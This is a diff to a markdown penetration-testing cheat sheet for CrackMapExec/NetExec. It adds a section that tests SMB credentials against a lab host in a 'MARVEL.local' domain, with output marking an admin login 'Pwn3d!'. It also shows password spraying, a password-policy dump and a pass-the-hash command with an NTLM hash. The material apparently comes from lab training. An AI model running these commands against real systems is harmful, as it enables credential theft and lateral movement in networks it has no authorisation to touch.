@@ -1,5 +1,7 @@
 - [Installation](#installation)
 
+- 
+
 ## [Installation](#installation-1)
 ```sh
 python3 -m pip install pipx
@@ -14,8 +16,24 @@ cme smb $ip -u users.txt -p sT333ve2
 cme smb $ip -u users.txt -p sT333ve2 --continue-on-success
 ```
 
+### [Test Credential](#test-credential)
+```sh
+PS C:\Users\fcastle> whoami
+marvel\fcastle
+PS C:\Users\fcastle> .\nxc.exe smb 10.1.1.6 -u fcastle -p Password1
+SMB         10.1.1.6        445    PUNISHER         [*] Windows 10.0 Build 19041 x64 (name:PUNISHER) (domain:MARVEL.local) (signing:False) (SMBv1:False)
+SMB         10.1.1.6        445    PUNISHER         [+] MARVEL.local\fcastle:Password1 (Pwn3d!)
+PS C:\Users\fcastle>
+PS C:\Users\fcastle> .\nxc.exe smb 10.1.1.6 -u pparker -p Password2
+SMB         10.1.1.6        445    PUNISHER         [*] Windows 10.0 Build 19041 x64 (name:PUNISHER) (domain:MARVEL.local) (signing:False) (SMBv1:False)
+SMB         10.1.1.6        445    PUNISHER         [+] MARVEL.local\pparker:Password2
+PS C:\Users\fcastle>
+```
+
 ### [Dump password policy with "--pass-pol"](#dump-password-policy-with---pass-pol-1)
+```sh
 cme smb $ip -u support -p '#00^BlackKnight' --pass-pol
+```
 
 ### [Pass-the-Hash (PtH) with "-H"](#pass-the-hash-pth-with--h--successful)
 cme smb $ip -u Administrator -H 7f1e4ff8c6a8e6b6fcae2d9c0572cd62
